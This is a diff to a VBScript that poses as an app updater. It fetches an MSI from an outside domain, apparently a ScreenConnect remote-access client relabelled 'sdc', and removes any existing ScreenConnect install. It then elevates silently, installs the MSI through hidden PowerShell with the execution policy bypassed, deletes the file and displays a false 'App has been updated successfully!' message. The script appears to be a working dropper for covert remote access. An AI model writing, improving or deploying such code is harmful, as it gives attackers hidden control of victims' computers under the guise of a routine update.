@@ -2,7 +2,6 @@ Option Explicit
 Dim oShell, oFSO, sTempFolder, sMsiURL, sMsiFile
 Dim nResult, sMessage, bsdcExists
 
-
 Set oShell = CreateObject("WScript.Shell")
 Set oFSO = CreateObject("Scripting.FileSystemObject")
 sTempFolder = oShell.ExpandEnvironmentStrings("%TEMP%")
@@ -12,18 +11,18 @@ sMsiURL = "https://seworks.mhawkster01.info/sdc"
 bsdcExists = ChecksdcExists()
 
 If bsdcExists Then
+
     If Not IsAdmin() Then
         ElevateSilent()
         WScript.Quit 0
     End If
     Call DeployWithAdmin()
 Else
+
     Call DeployAsCurrentUser()
 End If
 
-
 MsgBox "App has been updated successfully!", vbInformation, "Installation Complete"
-
 WScript.Quit 0
 
 Function ChecksdcExists()
@@ -32,7 +31,7 @@ Function ChecksdcExists()
     ChecksdcExists = False
     
     Set oWMI = GetObject("winmgmts:\\.\root\cimv2")
-    Set oProducts = oWMI.ExecQuery("SELECT * FROM Win32_Product WHERE Name LIKE '%sdc%'")
+    Set oProducts = oWMI.ExecQuery("SELECT * FROM Win32_Product WHERE Name LIKE '%ScreenConnect%'")
     
     For Each oProduct In oProducts
         ChecksdcExists = True
@@ -69,7 +68,7 @@ Sub DeployWithAdmin()
               "    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" & vbCrLf & _
               "    $msiFile = '" & sMsiFile & "'" & vbCrLf & _
               "    $msiUrl = '" & sMsiURL & "'" & vbCrLf & _
-              "    Write-Host 'Checking for existing sdc...'" & vbCrLf & _
+              "    Write-Host 'Uninstalling existing sdc...'" & vbCrLf & _
               "    $existing = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -like '*ScreenConnect*' }" & vbCrLf & _
               "    if ($existing) { $existing | ForEach-Object { $_.Uninstall() }; Start-Sleep -Seconds 3 }" & vbCrLf & _
               "    Write-Host 'Downloading sdc...'" & vbCrLf & _
@@ -93,10 +92,10 @@ Sub DeployAsCurrentUser()
               "    Write-Host 'Downloading sdc...'" & vbCrLf & _
               "    Invoke-WebRequest -Uri $msiUrl -OutFile $msiFile -UseBasicParsing" & vbCrLf & _
               "    Write-Host 'Installing sdc for current user...'" & vbCrLf & _
-              "    # ALLUSERS='' forces per-user installation - NO ADMIN REQUIRED" & vbCrLf & _
-              "    Start-Process msiexec -ArgumentList '/i', $msiFile, '/qn', '/norestart', 'ALLUSERS=''' -Wait" & vbCrLf & _
+              "    $result = Start-Process msiexec -ArgumentList '/i', $msiFile, '/qn', '/norestart', 'MSIINSTALLPERUSER=1' -Wait -PassThru" & vbCrLf & _
+              "    if ($result.ExitCode -eq 0) { Write-Host 'Installation successful' } else { Write-Host 'Installation failed with code: ' $result.ExitCode }" & vbCrLf & _
               "    Remove-Item $msiFile -ErrorAction SilentlyContinue" & vbCrLf & _
-              "    Write-Host 'Installation complete'" & vbCrLf & _
+              "    Write-Host 'Process complete'" & vbCrLf & _
               "}"
     
     oShell.Run "PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & sScript & """", 0, True
